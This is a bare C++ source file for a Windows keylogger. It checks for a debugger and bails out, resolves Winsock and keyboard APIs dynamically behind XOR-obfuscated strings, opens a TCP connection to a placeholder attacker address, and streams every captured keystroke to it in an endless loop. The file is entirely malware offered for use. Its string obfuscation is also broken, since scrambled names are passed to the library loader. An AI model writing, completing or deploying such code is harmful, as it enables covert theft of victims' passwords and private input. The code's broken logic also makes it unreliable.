#include <windows.h>
#include <winsock2.h>
#include <iostream>
#include <cstring>

// Define obfuscation macros
#define OBF_FUNC(name) name##_fnc

// Function pointer types for dynamic loading
typedef int (WINAPI *pWSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WINAPI *pSocket)(int, int, int);
typedef int (WINAPI *pConnect)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *pSend)(SOCKET, const char*, int, int);
typedef int (WINAPI *pClosesocket)(SOCKET);
typedef int (WINAPI *pWSACleanup)(void);
typedef SHORT (WINAPI *pGetAsyncKeyState)(int);
typedef void (WINAPI *pSleep)(DWORD);

// Encrypt strings
const char *enc(const char *str) {
    size_t len = strlen(str);
    char *encStr = new char[len + 1];
    for (size_t i = 0; i < len; ++i) {
        encStr[i] = str[i] ^ 0xAA; // Simple XOR encryption
    }
    encStr[len] = '\0';
    return encStr;
}

// Anti-debugging technique
bool isDebugged() {
    return IsDebuggerPresent();
}

// Log key function
void OBF_FUNC(LGKey)(int key, SOCKET sock, pSend Send) {
    char buffer[2];
    buffer[0] = (char)key;
    buffer[1] = '\0';
    Send(sock, buffer, 1, 0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (isDebugged()) {
        return 1; // Exit if being debugged
    }

    HMODULE hWs2_32 = LoadLibrary(enc("Ws2_32.dll"));
    HMODULE hUser32 = LoadLibrary(enc("User32.dll"));
    HMODULE hKernel32 = LoadLibrary(enc("Kernel32.dll"));

    if (!hWs2_32 || !hUser32 || !hKernel32) {
        return 1;
    }

    pWSAStartup WSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, enc("WSAStartup"));
    pSocket Socket = (pSocket)GetProcAddress(hWs2_32, enc("socket"));
    pConnect Connect = (pConnect)GetProcAddress(hWs2_32, enc("connect"));
    pSend Send = (pSend)GetProcAddress(hWs2_32, enc("send"));
    pClosesocket Closesocket = (pClosesocket)GetProcAddress(hWs2_32, enc("closesocket"));
    pWSACleanup WSACleanup = (pWSACleanup)GetProcAddress(hWs2_32, enc("WSACleanup"));

    pGetAsyncKeyState GetAsyncKeyState = (pGetAsyncKeyState)GetProcAddress(hUser32, enc("GetAsyncKeyState"));
    pSleep Sleep = (pSleep)GetProcAddress(hKernel32, enc("Sleep"));

    if (!WSAStartup || !Socket || !Connect || !Send || !Closesocket || !WSACleanup || !GetAsyncKeyState || !Sleep) {
        return 1;
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    SOCKET sock = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("REPLACE_WITH_LHOST");
    server.sin_port = htons(REPLACE_WITH_LPORT);  // Change to your desired port

    if (Connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        Closesocket(sock);
        WSACleanup();
        return 1;
    }

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                OBF_FUNC(LGKey)(key, sock, Send);
            }
        }
        Sleep(10);
    }

    Closesocket(sock);
    WSACleanup();

    return 0;
}
